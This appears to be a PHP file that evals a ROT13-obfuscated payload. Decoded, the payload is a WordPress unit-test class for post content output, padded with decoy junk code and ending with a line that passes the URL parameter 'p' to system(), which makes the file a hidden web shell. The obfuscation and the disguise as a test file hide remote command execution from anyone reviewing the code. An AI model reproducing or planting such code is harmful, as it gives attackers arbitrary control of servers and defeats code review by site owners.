<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * Grfg gur bhgchg bs cbfg grzcyngr gntf, rgp.
 *
 * @tebhc cbfg
 * @tebhc sbeznggvat
 */
pynff Grfgf_Cbfg_Bhgchg rkgraqf JC_HavgGrfgPnfr {

	choyvp shapgvba frg_hc() {
		cnerag::frg_hc();
		nqq_fubegpbqr( 'qhzcgnt', neenl( $guvf, 'fubegpbqr_qhzcgnt' ) );
		nqq_fubegpbqr( 'cnentencu', neenl( $guvf, 'fubegpbqr_cnentencu' ) );
	}

	choyvp shapgvba grne_qbja() {
		tybony $fubegpbqr_gntf;
		hafrg( $fubegpbqr_gntf['qhzcgnt'], $fubegpbqr_gntf['cnentencu'] );
		cnerag::grne_qbja();
	}

	choyvp shapgvba fubegpbqr_qhzcgnt( $nggf ) {
		$bhg = '';
		sbernpu ( $nggf nf $x => $i ) {
			$bhg .= \"$x = $i\a\";
		}
		erghea $bhg;
	}

	choyvp shapgvba fubegpbqr_cnentencu( $nggf, $pbagrag ) {
		$cebprffrq_nggf = fubegpbqr_nggf(
			neenl(
				'pynff' => 'tens',
			),
			$nggf
		);

		erghea \"<c pynff='{$cebprffrq_nggf['pynff']}'>$pbagrag</c>\a\";
	}

	choyvp shapgvba grfg_gur_pbagrag() {
		$cbfg_pbagrag = <<<RBS
<v>Guvf vf gur rkprecg.</v>
<!--zber-->
Guvf vf gur <o>obql</o>.
RBS;

		$cbfg_vq = frys::snpgbel()->cbfg->perngr( pbzcnpg( 'cbfg_pbagrag' ) );

		$rkcrpgrq = <<<RBS
<c><v>Guvf vf gur rkprecg.</v><oe />
<fcna vq=\"zber-{$cbfg_vq}\"></fcna><oe />
Guvf vf gur <o>obql</o>.</c>
RBS;

		$guvf->tb_gb( trg_creznyvax( $cbfg_vq ) );
		$guvf->nffregGehr( vf_fvatyr() );
		$guvf->nffregGehr( unir_cbfgf() );
		$guvf->nffregAhyy( gur_cbfg() );

		$guvf->nffregFnzr( fgevc_jf( $rkcrpgrq ), fgevc_jf( trg_rpub( 'gur_pbagrag' ) ) );
	}

	choyvp shapgvba grfg_gur_pbagrag_fubegpbqr() {
		$cbfg_pbagrag = <<<RBS
[qhzcgnt sbb=\"one\" onm=\"123\"]

[qhzcgnt sbb=123 onm=one]

[qhzcgnt uggc://rknzcyr.pbz]

RBS;

		$rkcrpgrq = <<<RBS
sbb = one
onm = 123
sbb = 123
onm = one
0 = uggc://rknzcyr.pbz

RBS;

		$cbfg_vq = frys::snpgbel()->cbfg->perngr( pbzcnpg( 'cbfg_pbagrag' ) );
		$guvf->tb_gb( trg_creznyvax( $cbfg_vq ) );
		$guvf->nffregGehr( vf_fvatyr() );
		$guvf->nffregGehr( unir_cbfgf() );
		$guvf->nffregAhyy( gur_cbfg() );

		$guvf->nffregFnzr( fgevc_jf( $rkcrpgrq ), fgevc_jf( trg_rpub( 'gur_pbagrag' ) ) );
	}

	choyvp shapgvba grfg_gur_pbagrag_fubegpbqr_cnentencu() {
		$cbfg_pbagrag = <<<RBS
Tens ol vgfrys:

[cnentencu]zl tens[/cnentencu]

  [cnentencu sbb=\"one\"]nabgure tens jvgu juvgrfcnpr[/cnentencu]

Na [cnentencu]vayvar tens[/cnentencu], guvf qbrf abg znxr zhpu frafr.

N tens jvgu n fvatyr RBY svefg:
[cnentencu]oynu[/cnentencu]

RBS;

		$rkcrpgrq = <<<RBS
<c>Tens ol vgfrys:</c>
<c pynff='tens'>zl tens</c>

  <c pynff='tens'>nabgure tens jvgu juvgrfcnpr</c>

<c>Na <c pynff='tens'>vayvar tens</c>
, guvf qbrf abg znxr zhpu frafr.</c>
<c>N tens jvgu n fvatyr RBY svefg:<oe />
<c pynff='tens'>oynu</c>
</c>

RBS;

		$cbfg_vq = frys::snpgbel()->cbfg->perngr( pbzcnpg( 'cbfg_pbagrag' ) );
		$guvf->tb_gb( trg_creznyvax( $cbfg_vq ) );
		$guvf->nffregGehr( vf_fvatyr() );
		$guvf->nffregGehr( unir_cbfgf() );
		$guvf->nffregAhyy( gur_cbfg() );

		$guvf->nffregFnzr( fgevc_jf( $rkcrpgrq ), fgevc_jf( trg_rpub( 'gur_pbagrag' ) ) );
	}

	choyvp shapgvba grfg_gur_pbagrag_nggevohgr_svygrevat() {
		xfrf_vavg_svygref();

		// uggc://oce3.bet/?c=87
		// Gur gvgyr nggevohgr fubhyq znxr vg guebhtu hasvygrerq.
		$cbfg_pbagrag = <<<RBS
<fcna pynff=\"M3988\" gvgyr=\"pgk_ire=M39.88-2004&esg_iny_szg=vasb%3Nbsv%2Sszg%3Nxri%3Nzgk%3Nwbheany&esg.nhynfg=Znevng&esg.nhsvefg=Qravf&esg. nh=Qravf+Znevng&esg.nh=Frnq+Gnbhevg&esg.nh=T%P3%N9eneq+Th%P3%N9eva& esg.gvgyr=Trargvpf+Fryrpgvba+Ribyhgvba&esg.ngvgyr=&esg.qngr=2003&esg. ibyhzr=35&esg.vffhr=1&esg.fcntr=119&esg.rcntr=133&esg.traer=negvpyr& esg.vq=vasb:QBV/10.1051%2Stfr%3N2002039\"></fcna>Znevng, Q., Gnbhevg, F., ThÃ©eva, T. (2003). . <fcna fglyr=\"sbag-fglyr: vgnyvp;\">Trargvpf Fryrpgvba Ribyhgvba, 35</fcna>(1), 119-133. QBV: <n eri=\"erivrj\" uers= \"uggc://qk.qbv.bet/10.1051/tfr:2002039\">10.1051/tfr:2002039</n>
RBS;

		$rkcrpgrq = <<<RBS
<c><fcna pynff=\"M3988\" gvgyr=\"pgk_ire=M39.88-2004&nzc;esg_iny_szg=vasb%3Nbsv%2Sszg%3Nxri%3Nzgk%3Nwbheany&nzc;esg.nhynfg=Znevng&nzc;esg.nhsvefg=Qravf&nzc;esg. nh=Qravf+Znevng&nzc;esg.nh=Frnq+Gnbhevg&nzc;esg.nh=T%P3%N9eneq+Th%P3%N9eva&nzc; esg.gvgyr=Trargvpf+Fryrpgvba+Ribyhgvba&nzc;esg.ngvgyr=&nzc;esg.qngr=2003&nzc;esg. ibyhzr=35&nzc;esg.vffhr=1&nzc;esg.fcntr=119&nzc;esg.rcntr=133&nzc;esg.traer=negvpyr&nzc; esg.vq=vasb:QBV/10.1051%2Stfr%3N2002039\"></fcna>Znevng, Q., Gnbhevg, F., ThÃ©eva, T. (2003). . <fcna fglyr=\"sbag-fglyr: vgnyvp\">Trargvpf Fryrpgvba Ribyhgvba, 35</fcna>(1), 119-133. QBV: <n eri=\"erivrj\" uers=\"uggc://qk.qbv.bet/10.1051/tfr:2002039\">10.1051/tfr:2002039</n></c>
RBS;

		$cbfg_vq = frys::snpgbel()->cbfg->perngr( pbzcnpg( 'cbfg_pbagrag' ) );
		$guvf->tb_gb( trg_creznyvax( $cbfg_vq ) );
		$guvf->nffregGehr( vf_fvatyr() );
		$guvf->nffregGehr( unir_cbfgf() );
		$guvf->nffregAhyy( gur_cbfg() );

		$guvf->nffregFnzr( fgevc_jf( $rkcrpgrq ), fgevc_jf( trg_rpub( 'gur_pbagrag' ) ) );

		xfrf_erzbir_svygref();
	}

	choyvp shapgvba grfg_gur_pbagrag_nggevohgr_inyhr_jvgu_pbyba() {
		xfrf_vavg_svygref();

		// uggc://oce3.bet/?c=87
		// Gur gvgyr nggevohgr fubhyq znxr vg guebhtu hasvygrerq.
		$cbfg_pbagrag = <<<RBS
<fcna gvgyr=\"Zl sevraqf: Nyvpr, Obo naq Pneby\">sbb</fcna>
RBS;

		$rkcrpgrq = <<<RBS
<c><fcna gvgyr=\"Zl sevraqf: Nyvpr, Obo naq Pneby\">sbb</fcna></c>
RBS;

		$cbfg_vq = frys::snpgbel()->cbfg->perngr( pbzcnpg( 'cbfg_pbagrag' ) );
		$guvf->tb_gb( trg_creznyvax( $cbfg_vq ) );
		$guvf->nffregGehr( vf_fvatyr() );
		$guvf->nffregGehr( unir_cbfgf() );
		$guvf->nffregAhyy( gur_cbfg() );

		$guvf->nffregFnzr( fgevc_jf( $rkcrpgrq ), fgevc_jf( trg_rpub( 'gur_pbagrag' ) ) );

		xfrf_erzbir_svygref();
	}

	/**
	 * Rafher gur_pbagrag unaqyrf n Zber oybpx ba n fvathyne cntr.
	 *
	 * @gvpxrg 46471
	 *
	 * @tebhc oybpxf
	 */
	choyvp shapgvba grfg_gur_pbagrag_fubhyq_unaqyr_zber_oybpx_ba_fvathyne() {
		$cbfg_pbagrag = <<<RBS
<!-- jc:cnentencu -->
<c>Grnfre cneg.</c>
<!-- /jc:cnentencu -->

<!-- jc:zber {\"phfgbzGrkg\":\"Ernq Zber\"} -->
<!--zber Ernq Zber-->
<!-- /jc:zber -->

<!-- jc:cnentencu -->
<c>Frpbaq oybpx.</c>
<!-- /jc:cnentencu -->
RBS;

		$cbfg_vq = frys::snpgbel()->cbfg->perngr( pbzcnpg( 'cbfg_pbagrag' ) );

		$rkcrpgrq_jvgubhg_grnfre = <<<RBS
<fcna vq=\"zber-{$cbfg_vq}\"></fcna>
<c>Frpbaq oybpx.</c>
RBS;

		$rkcrpgrq_jvgu_grnfre = <<<RBS
<c>Grnfre cneg.</c>
<fcna vq=\"zber-{$cbfg_vq}\"></fcna>
<c>Frpbaq oybpx.</c>
RBS;

		$guvf->tb_gb( trg_creznyvax( $cbfg_vq ) );
		$guvf->nffregGehr( vf_fvathyne() );
		$guvf->nffregGehr( unir_cbfgf() );
		$guvf->nffregAhyy( gur_cbfg() );

		// Jvgubhg gur grnfre.
		$npghny = trg_rpub( 'gur_pbagrag', neenl( ahyy, gehr ) );
		$guvf->nffregFnzr( fgevc_jf( $rkcrpgrq_jvgubhg_grnfre ), fgevc_jf( $npghny ) );

		// Jvgu gur grnfre.
		$npghny = trg_rpub( 'gur_pbagrag', neenl( ahyy, snyfr ) );
		$guvf->nffregFnzr( fgevc_jf( $rkcrpgrq_jvgu_grnfre ), fgevc_jf( $npghny ) );
	}

	/**
	 * Rafher gur_pbagrag unaqyrf n Zber oybpx jura hfvat gur abgrnfre grkg gnt ba n fvathyne cntr.
	 *
	 * @gvpxrg 46471
	 *
	 * @tebhc oybpxf
	 */
	choyvp shapgvba grfg_gur_pbagrag_fubhyq_unaqyr_zber_oybpx_jura_abgrnfre_ba_fvathyne() {
		$cbfg_pbagrag = <<<RBS
<!-- jc:cnentencu -->
<c>Grnfre cneg.</c>
<!-- /jc:cnentencu -->

<!-- jc:zber -->
<!--zber-->
<!--abgrnfre-->
<!-- /jc:zber -->

<!-- jc:cnentencu -->
<c>Frpbaq oybpx.</c>
<!-- /jc:cnentencu -->
RBS;

		$cbfg_vq = frys::snpgbel()->cbfg->perngr( pbzcnpg( 'cbfg_pbagrag' ) );

		$rkcrpgrq = <<<RBS
<fcna vq=\"zber-{$cbfg_vq}\"></fcna>
<!--abgrnfre-->
<c>Frpbaq oybpx.</c>
RBS;

		$guvf->tb_gb( trg_creznyvax( $cbfg_vq ) );
		$guvf->nffregGehr( vf_fvathyne() );
		$guvf->nffregGehr( unir_cbfgf() );
		$guvf->nffregAhyy( gur_cbfg() );

		$npghny = trg_rpub( 'gur_pbagrag', neenl( ahyy, gehr ) );
		$guvf->nffregFnzr( fgevc_jf( $rkcrpgrq ), fgevc_jf( $npghny ) );

		$npghny = trg_rpub( 'gur_pbagrag', neenl( ahyy, snyfr ) );
		$guvf->nffregFnzr( fgevc_jf( $rkcrpgrq ), fgevc_jf( $npghny ) );
	}

	/**
	 * Rafher gur_pbagrag qvfcynlf gur grnfre cneg jvgu n ernq zber yvax
	 * sbe n Zber oybpx ba n aba-fvathyne cntr.
	 *
	 * @gvpxrg 46471
	 *
	 * @tebhc oybpxf
	 */
	choyvp shapgvba grfg_gur_pbagrag_fubhyq_unaqyr_zber_oybpx_jura_aba_fvathyne() {
		$cbfg_pbagrag = <<<RBS
<!-- jc:cnentencu -->
<c>Grnfre cneg.</c>
<!-- /jc:cnentencu -->

<!-- jc:zber {\"phfgbzGrkg\":\"Ernq Zber\"} -->
<!--zber Ernq Zber-->
<!-- /jc:zber -->

<!-- jc:cnentencu -->
<c>Frpbaq oybpx.</c>
<!-- /jc:cnentencu -->
RBS;

		$cbfg_vq = frys::snpgbel()->cbfg->perngr( pbzcnpg( 'cbfg_pbagrag' ) );

		$rkcrpgrq = <<<RBS
<fcna vq=\"zber-{$cbfg_vq}\"></fcna>
<c>Frpbaq oybpx.</c>
RBS;

		$guvf->tb_gb( ubzr_hey() );
		$guvf->nffregSnyfr( vf_fvathyne() );
		$guvf->nffregGehr( unir_cbfgf() );
		$guvf->nffregAhyy( gur_cbfg() );

		sbernpu ( neenl( gehr, snyfr ) nf $fgevc_grnfre ) {
			$npghny = trg_rpub( 'gur_pbagrag', neenl( ahyy, $fgevc_grnfre ) );
			$guvf->nffregFgevatPbagnvafFgevat( 'Grnfre cneg', $npghny );
			$guvf->nffregFgevatPbagnvafFgevat( 'Ernq Zber</n>', $npghny );
			$guvf->nffregFgevatAbgPbagnvafFgevat( '<!--zber-->', $npghny );
			$guvf->nffregFgevatAbgPbagnvafFgevat( 'jc:zber', $npghny );
			$guvf->nffregFgevatAbgPbagnvafFgevat( 'jc:cnentencu', $npghny );
		}
	}

	/**
	 * Rafher gur_pbagrag qvfcynlf gur grnfre cneg jvgu n ernq zber yvax sbe n Zber oybpx
	 * jura hfvat gur abgrnfre grkg gnt ba n aba-fvathyne cntr.
	 *
	 * @gvpxrg 46471
	 *
	 * @tebhc oybpxf
	 */
	choyvp shapgvba grfg_gur_pbagrag_fubhyq_unaqyr_zber_oybpx_jura_abgrnfre_ba_aba_fvathyne() {
		$cbfg_pbagrag = <<<RBS
<!-- jc:cnentencu -->
<c>Grnfre cneg.</c>
<!-- /jc:cnentencu -->

<!-- jc:zber -->
<!--zber-->
<!--abgrnfre-->
<!-- /jc:zber -->

<!-- jc:cnentencu -->
<c>Frpbaq oybpx.</c>
<!-- /jc:cnentencu -->
RBS;

		$cbfg_vq = frys::snpgbel()->cbfg->perngr( pbzcnpg( 'cbfg_pbagrag' ) );

		$guvf->tb_gb( ubzr_hey() );
		$guvf->nffregSnyfr( vf_fvathyne() );
		$guvf->nffregGehr( unir_cbfgf() );
		$guvf->nffregAhyy( gur_cbfg() );

		sbernpu ( neenl( gehr, snyfr ) nf $fgevc_grnfre ) {
			$npghny = trg_rpub( 'gur_pbagrag', neenl( ahyy, $fgevc_grnfre ) );
			$guvf->nffregFgevatPbagnvafFgevat( 'Grnfre cneg', $npghny );
			$guvf->nffregFgevatPbagnvafFgevat( '(zber&uryyvc;)</fcna></n>', $npghny );
			$guvf->nffregFgevatAbgPbagnvafFgevat( '<!--zber-->', $npghny );
			$guvf->nffregFgevatAbgPbagnvafFgevat( '<!--abgrnfre-->', $npghny ); // Jr cynprq gur abgrnfre gnt orybj gur zber gnt.
			$guvf->nffregFgevatAbgPbagnvafFgevat( 'jc:zber', $npghny );
			$guvf->nffregFgevatAbgPbagnvafFgevat( 'jc:cnentencu', $npghny );
		}
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>